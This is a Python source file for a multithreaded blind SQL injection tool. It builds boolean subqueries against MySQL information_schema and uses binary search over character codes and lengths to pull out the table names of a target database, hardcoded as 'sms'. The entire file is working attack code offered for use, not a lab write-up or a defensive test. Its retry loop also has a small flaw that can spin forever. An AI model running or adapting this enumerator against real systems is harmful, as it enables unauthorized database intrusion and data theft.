import threading
import core

core.read_cache()

class Table:
    def __init__(self, name):
        self.name = name
        self.columns = []

    def add_column(self, column_name):
        if column_name not in self.columns:
            self.columns.append(column_name)

class TableCharacterTester(threading.Thread):
    def __init__(self, database, position, index):
        super(TableCharacterTester, self).__init__()
        self.database = database
        self.position = position
        self.index = index
        self.character = -1

    def run(self):
        self.character = self.get_char()
        while self.character == -1:
            self.get_char()

    def test_character(self, character, position, operation=">="):
        injection_string = "(SELECT count(*) FROM (SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=%s LIMIT %d,1) " \
                           "as temp where ASCII(SUBSTRING(TABLE_NAME, %d, 1))%s%d)" % \
                           (core.char_array(self.database), self.index - 1, position, operation, character)
        return core.check_truth(injection_string)

    def get_char(self):
        min_char = 1
        max_char = 128
        character = (min_char + max_char) / 2

        while True:
            length_check = self.test_character(character, self.position)
            core.println("Checked table character %d for index %d for position %d: %s" % (character, self.index, self.position, length_check))
            if length_check:
                min_char = character
            else:
                max_char = character - 1

            if min_char == max_char or max_char - min_char == 1:
                min_length_check = self.test_character(min_char, self.position, "=")
                if min_length_check:
                    core.println("Found table character %d for index %d for position %d" % (min_char, self.index, self.position))
                    return min_char
                max_length_check = self.test_character(max_char, self.position, "=")
                if max_length_check:
                    core.println("Found table character %d for index %d for position %d" % (max_char, self.index, self.position))
                    return max_char
                return -1

            character = (min_char + max_char) / 2

        return -1


class TableBruteForcer(threading.Thread):
    def __init__(self, database, index):
        super(TableBruteForcer, self).__init__()
        self.database = database
        self.character_count = -1
        self.found_characters = ""
        self.index = index

    def get_name(self):
        return self.found_characters

    def run(self):
        self.get_characters()

    def get_characters(self):
        self.found_characters = ""
        self.character_count = self.get_length()

        for j in range((self.character_count // 10) + 1):
            table_character_testers = []
            for i in range(j * 10, (j + 1) * 10):
                if i < self.character_count:
                    table_character_tester = TableCharacterTester(self.database, i + 1, self.index)
                    table_character_tester.start()
                    table_character_testers.append(table_character_tester)

            for table_character_tester in table_character_testers:
                table_character_tester.join()
                self.found_characters += chr(table_character_tester.character)

        core.println("Found table name at index %d is %s" % (self.index, self.found_characters))

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) FROM (SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=%s LIMIT %d,1) " \
                           "as temp where length(TABLE_NAME)%s%d)" %\
                           (core.char_array(self.database), self.index - 1, operation, count)
        return core.check_truth(injection_string)


    def get_length(self):
        min_count = 1
        max_count = 64

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked table length for index %d count %d: %s" % (self.index, count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found table length for index %d count %d" % (self.index, min_count))
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found table length for index %d count %d" % (self.index, max_count))
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

class TableDetector:
    def __init__(self, database):
        self.database = database
        self.tables = []

    def start(self):
        pass

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) from information_schema.TABLES where TABLE_SCHEMA=%s)%s%d" %\
                           (core.char_array(self.database), operation, count)
        return core.check_truth(injection_string)

    def get_count(self):
        min_count = 1
        max_count = 1024

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked count %d: %s" % (count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found count %d" % min_count)
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found count %d" % max_count)
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

    def get_tables(self):
        table_count = self.get_count()
        core.println("Found %d tables\n" % table_count)

        table_brute_forcers = []
        for i in range(table_count):
            table_brute_forcer = TableBruteForcer(self.database, i + 1)
            table_brute_forcer.start()
            table_brute_forcer.join()
            table_brute_forcers.append(table_brute_forcer)

        self.tables = []

        for table_brute_forcer in table_brute_forcers:
            # table_brute_forcer.join()
            core.println("Found table: %s" % table_brute_forcer.get_name())
            self.tables.append(Table(table_brute_forcer.get_name()))

if __name__ == '__main__':
    database = "sms"
    core.read_cache()
    table_detector = TableDetector(database)
    table_detector.get_tables()